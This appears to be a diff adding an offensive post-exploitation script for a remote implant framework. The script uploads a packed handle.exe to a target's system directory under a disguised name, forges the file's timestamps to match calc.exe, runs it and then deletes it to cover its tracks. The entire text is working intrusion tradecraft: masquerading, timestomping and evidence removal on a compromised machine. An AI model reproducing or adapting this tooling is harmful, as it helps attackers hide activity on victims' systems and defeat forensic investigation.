@@ -1,0 +1,43 @@
+#-------------------------------------------------------------------------------
+# File: handle.eps
+# Description: Uploads the handle.exe tool to the targets temp directory.
+#			It then executes it with -a.
+#			It will then delete the uploaded file and return the 
+#			targets system directory.
+# 25 July 2007  Created....
+#
+#-------------------------------------------------------------------------------
+
+
+string $ScriptsDir = GetEnv("SCRIPTSDIR");
+string $sSysPath = GetEnv("SYSPATH");
+string $remoteToolName = GetEnv("remoteToolName");
+
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\cmdl16.exe";
+} 
+
+ifnot (prompt "Do you want to upload the tool as \"$remoteToolName\" ?") {
+	$remoteToolName=GetInput("What do you want to upload the tool as?");
+}
+
+SetEnv("remoteToolName", "$remoteToolName");
+
+string $split = SplitPath("$remoteToolName");
+
+@echo on;
+
+
+ifnot (`put $ScriptsDir\\..\\..\\..\\B-Tools\\handle_packed.exe -name $remoteToolName`) {
+	echo "File already exists?";
+	return false;
+}
+`matchtimes $sSysPath\\calc.exe $remoteToolName`;
+prompt `background run -command "$remoteToolName -a" -redirect handle`;
+echo "Wait until execution finishes before deleting it.";
+if (prompt `del $split[1] -path "$split[0]"`){
+	sleep(300);
+	`dir $split[1] -path "$split[0]"`;
+}
+
+return true;
